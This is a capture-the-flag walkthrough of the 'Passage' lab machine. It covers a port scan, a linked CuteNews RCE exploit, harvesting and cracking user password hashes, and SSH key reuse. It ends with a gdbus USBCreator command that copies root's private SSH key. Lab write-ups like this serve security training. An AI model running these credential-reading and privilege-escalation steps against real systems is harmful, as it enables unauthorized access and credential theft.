## Passage

Difficulty: Medium

### User Flag

#### Foothold

```
rustscan -a 10.10.10.206 --ulimit 5000 -- -A -sV -sC -oN nmap.txt
```

![rustscan](https://github.com/b1d0ws/OSCP/assets/58514930/0d41a56e-f3ae-4655-9f96-cf459b8797c3)

<br>

The website uses CuteNew PHP Management System.

![website](https://github.com/b1d0ws/OSCP/assets/58514930/4d619432-e5f1-4818-a4ab-455fdd847b6e)

<br>

Searching for vulnerabilities, we find this RCE [exploit](https://www.exploit-db.com/exploits/48800).

![cuteNews](https://github.com/b1d0ws/OSCP/assets/58514930/4bdef16d-56e4-4054-9592-155b4ec3d7b1)

![firstExploit](https://github.com/b1d0ws/OSCP/assets/58514930/fe6e5380-5df9-4d44-9689-21a3f85870ea)

#### Paul User

Looking inside CuteNews files, we find password hashes from the system. One of them is crackable in Crackstation and belongs to user paul.

```
/var/www/html/CuteNews/cdata/users$ cat *
```

![catUsers](https://github.com/b1d0ws/OSCP/assets/58514930/af12818d-fe5d-406e-a7fb-7d99ed6e66cf)

![base64Decode](https://github.com/b1d0ws/OSCP/assets/58514930/8387860b-e95a-4c1b-bfce-5dcee96d534b)

![crackHash](https://github.com/b1d0ws/OSCP/assets/58514930/87b9d3b4-f546-4436-b502-fab67a0208c8)

### Root Flag

#### Nadav User

If you observe, the SSH key of paul has nadav username on authorized_keys, you can use this key to login into SSH as nadav.

![authorizedKeys](https://github.com/b1d0ws/OSCP/assets/58514930/7f69662b-9f89-4ecb-b3ef-b9dbd0d7abdd)

#### Root User

In .viminfo , we find a dbus related file mark.

![dbusVimInfo](https://github.com/b1d0ws/OSCP/assets/58514930/1a926cf6-e0d7-4ae4-9708-cf6cad3fea05)

Searching for dbus privilege escalation, [this article](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) explains one.

![dbusPrivEsc](https://github.com/b1d0ws/OSCP/assets/58514930/02b61cc7-f46b-46a1-81f3-8707f22d9a76)

Use the command above to get root ssh key.

```
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /dev/shm/id_rsa true
```

![exploitRoot](https://github.com/b1d0ws/OSCP/assets/58514930/35df80b4-6ccb-4edb-a9f7-136ee3895af5)
